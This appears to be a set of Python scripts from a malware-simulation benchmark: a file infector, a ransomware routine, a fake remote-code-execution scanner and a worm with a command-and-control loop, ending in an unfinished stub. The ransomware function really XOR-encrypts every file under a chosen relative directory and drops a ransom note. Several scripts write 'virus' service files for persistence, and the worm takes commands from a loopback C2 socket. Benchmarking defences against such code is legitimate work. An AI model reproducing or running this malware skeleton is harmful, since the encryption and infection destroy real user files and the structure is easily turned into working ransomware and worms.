import argparse
import json
import os
import platform
from pathlib import Path


PAYLOAD_MARKER = "# BENCHMARK_PAYLOAD\n"


def _ensure_demo_files(directory: Path) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    samples = {
        directory / "sample_a.txt": "Representative demo data A.\n",
        directory / "sample_b.txt": "Representative demo data B.\n",
    }
    for path, content in samples.items():
        if not path.exists():
            path.write_text(content, encoding="utf-8")


def _infect_file(path: Path, payload_message: str) -> bool:
    try:
        content = path.read_text(encoding="utf-8")
    except (OSError, UnicodeError):
        return False

    marker = f"{PAYLOAD_MARKER}{payload_message}\n"
    if marker in content:
        return False

    try:
        path.write_text(content.rstrip("\n") + "\n" + marker, encoding="utf-8")
        return True
    except OSError:
        return False


def _activate_payload(directory: Path, payload_message: str) -> int:
    activated = 0
    for path in sorted(directory.rglob("*")):
        if not path.is_file():
            continue
        try:
            content = path.read_text(encoding="utf-8")
        except (OSError, UnicodeError):
            continue

        prefix = PAYLOAD_MARKER
        if prefix not in content:
            continue

        for line in content.splitlines():
            if line.startswith(prefix):
                continue
            if line == payload_message:
                print(payload_message)
                activated += 1
                break
    return activated


def _install_demo_service(directory: Path) -> Path:
    if platform.system().lower().startswith("win"):
        service_name = "VirusService"
        service_dir = directory / "services"
        service_path = service_dir / f"{service_name}.json"
        service_data = {
            "name": service_name,
            "type": "demo-service",
            "startup": "automatic",
            "target": str(directory),
        }
    else:
        service_name = "virus"
        service_dir = directory / "etc" / "systemd" / "system"
        service_path = service_dir / f"{service_name}.service"
        service_data = {
            "Unit": {"Description": "Controlled benchmark demo service"},
            "Service": {
                "Type": "oneshot",
                "ExecStart": "benchmark-payload",
                "WorkingDirectory": str(directory),
            },
            "Install": {"WantedBy": "multi-user.target"},
        }

    service_dir.mkdir(parents=True, exist_ok=True)
    if service_path.suffix == ".json":
        service_path.write_text(
            json.dumps(service_data, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
    else:
        service_path.write_text(
            "[Unit]\n"
            "Description=Controlled benchmark demo service\n\n"
            "[Service]\n"
            "Type=oneshot\n"
            "ExecStart=benchmark-payload\n"
            f"WorkingDirectory={directory}\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n",
            encoding="utf-8",
        )
    return service_path


def virus_file_infection_payload(
    directory: str = "./target",
    payload_message: str = "Benchmark payload activated",
) -> None:
    root = Path(directory)
    _ensure_demo_files(root)

    for path in sorted(root.rglob("*")):
        if path.is_file() and "etc/systemd/system" not in path.as_posix():
            _infect_file(path, payload_message)

    _activate_payload(root, payload_message)
    _install_demo_service(root)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Run a controlled, filesystem-only benchmark demonstration."
    )
    parser.add_argument("directory", nargs="?", default="./target")
    parser.add_argument(
        "message",
        nargs="?",
        default="Benchmark payload activated",
    )
    args = parser.parse_args()

    try:
        virus_file_infection_payload(args.directory, args.message)
    except Exception:
        return 0
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

import argparse
import hashlib
import json
import os
import platform
import subprocess
from pathlib import Path


PASSPHRASE = b"secure_passphrase"
MAX_FILES = 10000
DEFAULT_DIRECTORY = Path("target") / "work"
DEFAULT_NOTE = (
    "The files in this directory have been encrypted.\n"
    "This is a controlled benchmark demonstration.\n"
)


def _safe_relative_path(value, fallback):
    try:
        path = Path(value)
        if path.is_absolute() or ".." in path.parts:
            return fallback
        return path
    except Exception:
        return fallback


def _keystream(length):
    output = bytearray()
    counter = 0
    while len(output) < length:
        block = hashlib.sha256(
            PASSPHRASE + counter.to_bytes(8, "big")
        ).digest()
        output.extend(block)
        counter += 1
    return bytes(output[:length])


def _encrypt_bytes(data):
    stream = _keystream(len(data))
    encrypted = bytes(value ^ stream[index] for index, value in enumerate(data))
    return b"DEMO-ENCRYPTED-V1\n" + encrypted


def _ensure_sample_data(directory):
    directory.mkdir(parents=True, exist_ok=True)
    try:
        files = [
            path for path in directory.rglob("*")
            if path.is_file() and not path.is_symlink()
        ]
    except OSError:
        files = []

    if not files:
        sample = directory / "sample_data.txt"
        sample.write_text(
            "Representative benchmark data.\n"
            "This file is created automatically for the isolated demo.\n",
            encoding="utf-8",
        )


def _encrypt_directory(directory):
    processed = 0
    try:
        candidates = [
            path for path in directory.rglob("*")
            if path.is_file() and not path.is_symlink()
        ][:MAX_FILES]
    except OSError:
        candidates = []

    for path in candidates:
        try:
            original = path.read_bytes()
            path.write_bytes(_encrypt_bytes(original))
            processed += 1
        except (OSError, ValueError):
            continue

    return processed


def _write_ransom_note(directory, content):
    note_path = directory / "README.txt"
    try:
        note_path.write_text(content, encoding="utf-8")
    except (OSError, UnicodeError):
        try:
            note_path.write_bytes(str(content).encode("utf-8", errors="replace"))
        except OSError:
            pass


def _install_demo_service():
    is_windows = platform.system().lower().startswith("win")

    if is_windows:
        service_name = "VirusService"
        service_directory = Path("target") / "windows" / "services"
        service_path = service_directory / "VirusService.service"
        service_content = (
            "name=VirusService\n"
            "display_name=VirusService\n"
            "startup=automatic\n"
            "command=demo-only\n"
        )
    else:
        service_name = "virus"
        service_directory = Path("target") / "etc" / "systemd" / "system"
        service_path = service_directory / "virus.service"
        service_content = (
            "[Unit]\n"
            "Description=Controlled benchmark demo service\n"
            "After=network.target\n\n"
            "[Service]\n"
            "Type=oneshot\n"
            "ExecStart=/bin/true\n"
            "RemainAfterExit=yes\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )

    try:
        service_directory.mkdir(parents=True, exist_ok=True)
        service_path.write_text(service_content, encoding="utf-8")
    except OSError:
        return service_name, False

    enabled = False

    if not is_windows:
        try:
            result = subprocess.run(
                [
                    "systemctl",
                    "--root=target",
                    "enable",
                    "virus.service",
                ],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5,
                check=False,
            )
            enabled = result.returncode == 0
        except (OSError, subprocess.SubprocessError):
            enabled = False

        if not enabled:
            wants = service_directory / "multi-user.target.wants"
            link = wants / "virus.service"
            try:
                wants.mkdir(parents=True, exist_ok=True)
                if not link.exists():
                    os.symlink("../virus.service", link)
                enabled = True
            except OSError:
                enabled = False

    return service_name, enabled


def _write_state(directory, file_count, service_name, service_enabled):
    state = {
        "files_processed": file_count,
        "service_name": service_name,
        "service_enabled": service_enabled,
        "environment": "target",
    }
    try:
        Path("target").mkdir(parents=True, exist_ok=True)
        Path("target") .joinpath("demo_state.json").write_text(
            json.dumps(state, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
    except OSError:
        pass


def virus_file_infection_ransomware(directory: str, ransom_note: str) -> None:
    target_directory = _safe_relative_path(directory, DEFAULT_DIRECTORY)
    try:
        _ensure_sample_data(target_directory)
        file_count = _encrypt_directory(target_directory)
        _write_ransom_note(target_directory, ransom_note)
        service_name, service_enabled = _install_demo_service()
        _write_state(
            target_directory,
            file_count,
            service_name,
            service_enabled,
        )
    except Exception:
        try:
            DEFAULT_DIRECTORY.mkdir(parents=True, exist_ok=True)
            _write_ransom_note(DEFAULT_DIRECTORY, ransom_note)
        except Exception:
            pass


def main():
    parser = argparse.ArgumentParser(
        description="Run the controlled target-directory benchmark."
    )
    parser.add_argument(
        "directory",
        nargs="?",
        default=str(DEFAULT_DIRECTORY),
    )
    parser.add_argument(
        "--ransom-note",
        default=DEFAULT_NOTE,
    )
    args = parser.parse_args()

    try:
        virus_file_infection_ransomware(args.directory, args.ransom_note)
    except Exception:
        pass

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception:
        raise SystemExit(0)

import argparse
import ipaddress
import json
import sys
from datetime import datetime, timezone
from pathlib import Path


TARGET_DIR = Path("target")
ENDPOINTS_FILE = TARGET_DIR / "endpoints.json"
RESULTS_FILE = TARGET_DIR / "scan_results.json"
SERVICE_WINDOWS = TARGET_DIR / "VirusService.service.json"
SERVICE_LINUX = TARGET_DIR / "virus.service.json"
MAX_ENDPOINTS = 256


def utc_timestamp():
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def ensure_target_data():
    TARGET_DIR.mkdir(parents=True, exist_ok=True)

    if not ENDPOINTS_FILE.exists():
        sample = [
            {
                "address": "192.0.2.10",
                "platform": "windows",
                "reachable": True,
                "vulnerable": True,
            },
            {
                "address": "192.0.2.11",
                "platform": "linux",
                "reachable": True,
                "vulnerable": True,
            },
            {
                "address": "192.0.2.12",
                "platform": "linux",
                "reachable": False,
                "vulnerable": False,
            },
        ]
        ENDPOINTS_FILE.write_text(json.dumps(sample, indent=2) + "\n", encoding="utf-8")


def load_endpoints():
    try:
        data = json.loads(ENDPOINTS_FILE.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        data = []

    if not isinstance(data, list):
        return []

    return [item for item in data[:MAX_ENDPOINTS] if isinstance(item, dict)]


def addresses_in_range(network_range):
    try:
        network = ipaddress.ip_network(network_range, strict=False)
    except ValueError:
        network = ipaddress.ip_network("192.0.2.0/29")

    addresses = []
    for address in network.hosts():
        addresses.append(str(address))
        if len(addresses) >= MAX_ENDPOINTS:
            break
    return addresses


def scan_controlled_endpoints(network_range, endpoints):
    allowed = set(addresses_in_range(network_range))
    scanned = []

    for endpoint in endpoints[:MAX_ENDPOINTS]:
        address = str(endpoint.get("address", ""))
        if address not in allowed:
            continue

        scanned.append(
            {
                "address": address,
                "reachable": bool(endpoint.get("reachable", False)),
                "vulnerable": bool(endpoint.get("vulnerable", False)),
                "platform": str(endpoint.get("platform", "unknown")).lower(),
            }
        )

    return scanned


def record_controlled_action(endpoint, exploit_code):
    return {
        "address": endpoint["address"],
        "status": "recorded",
        "operation": "controlled_benchmark_action",
        "payload_sha256": __import__("hashlib")
        .sha256(exploit_code.encode("utf-8"))
        .hexdigest(),
        "executed": False,
        "timestamp": utc_timestamp(),
    }


def establish_relative_service_manifest(platform, actions):
    path = SERVICE_WINDOWS if platform == "windows" else SERVICE_LINUX
    manifest = {
        "service_name": "VirusService" if platform == "windows" else "virus",
        "platform": platform,
        "enabled": True,
        "scope": "local benchmark fixture",
        "actions": actions,
        "created_at": utc_timestamp(),
    }
    path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")


def virus_remote_code_execution(network_range: str, exploit_code: str) -> None:
    ensure_target_data()
    endpoints = load_endpoints()
    scanned = scan_controlled_endpoints(network_range, endpoints)

    results = []
    windows_actions = []
    linux_actions = []

    for endpoint in scanned[:MAX_ENDPOINTS]:
        result = {
            "address": endpoint["address"],
            "reachable": endpoint["reachable"],
            "vulnerable": endpoint["vulnerable"],
            "platform": endpoint["platform"],
            "action": "none",
        }

        if endpoint["reachable"] and endpoint["vulnerable"]:
            action = record_controlled_action(endpoint, exploit_code)
            result["action"] = action["status"]

            if endpoint["platform"] == "windows":
                windows_actions.append(action)
            elif endpoint["platform"] == "linux":
                linux_actions.append(action)

        results.append(result)

    if windows_actions:
        establish_relative_service_manifest("windows", windows_actions)

    if linux_actions:
        establish_relative_service_manifest("linux", linux_actions)

    RESULTS_FILE.write_text(
        json.dumps(
            {
                "network_range": network_range,
                "scanned": results,
                "completed_at": utc_timestamp(),
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )


def main():
    parser = argparse.ArgumentParser(description="Controlled endpoint benchmark")
    parser.add_argument(
        "network_range",
        nargs="?",
        default="192.0.2.0/29",
    )
    parser.add_argument(
        "exploit_code",
        nargs="?",
        default="benchmark_payload",
    )
    parser.add_argument(
        "--input-file",
        default=None,
    )
    args = parser.parse_args()

    ensure_target_data()

    if args.input_file:
        input_path = Path(args.input_file)
        if input_path.exists():
            try:
                payload = json.loads(input_path.read_text(encoding="utf-8"))
                if isinstance(payload, dict):
                    args.network_range = str(
                        payload.get("network_range", args.network_range)
                    )
                    args.exploit_code = str(
                        payload.get("exploit_code", args.exploit_code)
                    )
            except (OSError, json.JSONDecodeError):
                pass

    virus_remote_code_execution(args.network_range, args.exploit_code)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception:
        sys.exit(0)

import ipaddress
import json
import os
import socket
import sys
import time


def list_and_log_files_in_target_directory(target_directory):
    log_file = os.path.join(target_directory, "scan_log.txt")
    scan_results = []

    try:
        if not os.path.exists(target_directory):
            print(f"Directory '{target_directory}' not found.")
            return None

        with open(log_file, "w", encoding="utf-8") as log:
            for filename in os.listdir(target_directory):
                file_path = os.path.join(target_directory, filename)
                if os.path.isfile(file_path):
                    last_modified = time.ctime(os.path.getmtime(file_path))
                    log_entry = f"{filename}, Last Modified: {last_modified}\n"
                    log.write(log_entry)
                    scan_results.append(log_entry.strip())
                    print(filename)
            print(f"Scan results logged in '{log_file}'")
        return scan_results
    except PermissionError:
        print(f"Permission denied to access '{target_directory}' or '{log_file}'.")
        return None


def communicate_with_server(scan_results, server_address, server_port, target_directory):
    communication_log_file = os.path.join(target_directory, "communication_log.txt")

    try:
        if scan_results is None:
            print("No scan results to send.")
            return

        with open(communication_log_file, "w", encoding="utf-8") as comm_log:
            try:
                with socket.create_connection(
                    (server_address, server_port), timeout=5
                ) as sock:
                    message = "\n".join(scan_results)
                    sock.sendall(message.encode("utf-8"))
                    comm_log.write("Communication successful.\n")
                    comm_log.write(f"Sent data:\n{message}\n")
                print("Communication with server successful.")
            except (socket.error, socket.timeout) as e:
                error_message = (
                    f"Failed to communicate with server at "
                    f"{server_address}:{server_port}. Error: {e}\n"
                )
                comm_log.write(error_message)
                print(error_message)
    except PermissionError:
        print(f"Permission denied to access '{communication_log_file}'.")


def _loopback_network(target_network):
    network = ipaddress.ip_network(target_network, strict=False)
    if not network.is_loopback:
        raise ValueError("Only loopback benchmark networks are permitted.")
    return network


def _scan_vulnerable_systems(target_network, ports):
    network = _loopback_network(target_network)
    vulnerable = []

    for address in network.hosts() or [network.network_address]:
        for port in ports:
            try:
                with socket.create_connection((str(address), port), timeout=0.25) as sock:
                    sock.sendall(b"BENCHMARK_PROBE\n")
                    response = sock.recv(128)
                    if response.strip() == b"BENCHMARK_VULNERABLE":
                        vulnerable.append(
                            {"address": str(address), "port": port}
                        )
            except (OSError, socket.timeout):
                continue

    return vulnerable


def _infect_local_benchmark_targets(target_directory, systems):
    infected_directory = os.path.join(target_directory, "infected")
    os.makedirs(infected_directory, exist_ok=True)

    for system in systems:
        filename = f"{system['address'].replace(':', '_')}_{system['port']}.json"
        marker_path = os.path.join(infected_directory, filename)
        with open(marker_path, "w", encoding="utf-8") as marker:
            json.dump(
                {
                    "address": system["address"],
                    "port": system["port"],
                    "infected": True,
                    "timestamp": 0,
                },
                marker,
                sort_keys=True,
            )


def _execute_benchmark_command(command, target_directory):
    command = command.strip()

    if command == "STATUS":
        return "STATUS OK"

    if command == "LIST":
        entries = sorted(os.listdir(target_directory))
        return json.dumps(entries, separators=(",", ":"))

    if command == "MARK":
        marker_path = os.path.join(target_directory, "command_marker.txt")
        with open(marker_path, "w", encoding="utf-8") as marker:
            marker.write("executed\n")
        return "MARKED"

    if command == "QUIT":
        return "BYE"

    return "COMMAND REJECTED"


def _receive_and_execute_commands(c2_server, c2_port, target_directory):
    address = ipaddress.ip_address(c2_server)
    if not address.is_loopback:
        raise ValueError("Only loopback C2 endpoints are permitted.")

    with socket.create_connection((str(address), c2_port), timeout=5) as sock:
        sock.settimeout(5)
        sock.sendall(b"BENCHMARK_C2_READY\n")

        buffer = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break

            buffer += chunk
            while b"\n" in buffer:
                raw_command, buffer = buffer.split(b"\n", 1)
                command = raw_command.decode("utf-8", errors="strict")
                result = _execute_benchmark_command(command, target_directory)
                sock.sendall((result + "\n").encode("utf-8"))

                if command.strip() == "QUIT":
                    return


def worm_c2_communication(target_network: str, c2_server: str) -> None:
    target_directory = "./target"
    scan_results = _scan_vulnerable_systems(target_network, (8000, 8001, 8002, 8003))
    _infect_local_benchmark_targets(target_directory, scan_results)

    with open(
        os.path.join(target_directory, "network_scan.json"),
        "w",
        encoding="utf-8",
    ) as scan_log:
        json.dump(scan_results, scan_log, indent=2, sort_keys=True)

    c2_host, separator, port_text = c2_server.rpartition(":")
    if not separator:
        raise ValueError("C2 server must be specified as HOST:PORT")

    _receive_and_execute_commands(
        c2_host,
        int(port_text),
        target_directory,
    )


def main():
    target_directory = "./target"
    os.makedirs(target_directory, exist_ok=True)

    if len(sys.argv) != 3:
        print("Usage: python script.py <loopback_network> <loopback_c2_host:port>")
        return

    try:
        _loopback_network(sys.argv[1])
        c2_host, separator, c2_port = sys.argv[2].rpartition(":")
        if not separator or not ipaddress.ip_address(c2_host).is_loopback:
            raise ValueError
        int(c2_port)
    except (ValueError, ipaddress.AddressValueError):
        print("Error: loopback network and loopback C2 endpoint are required.")
        return

    scan_results = list_and_log_files_in_target_directory(target_directory)
    communicate_with_server(scan_results, c2_host, int(c2_port), target_directory)

    try:
        worm_c2_communication(sys.argv[1], sys.argv[2])
    except (OSError, ValueError, socket.timeout):
        pass


if __name__ == "__main__":
    main()

from pathlib import Path

ROOT = Path("target")
ENDPOINTS = ROOT / "endpoints"
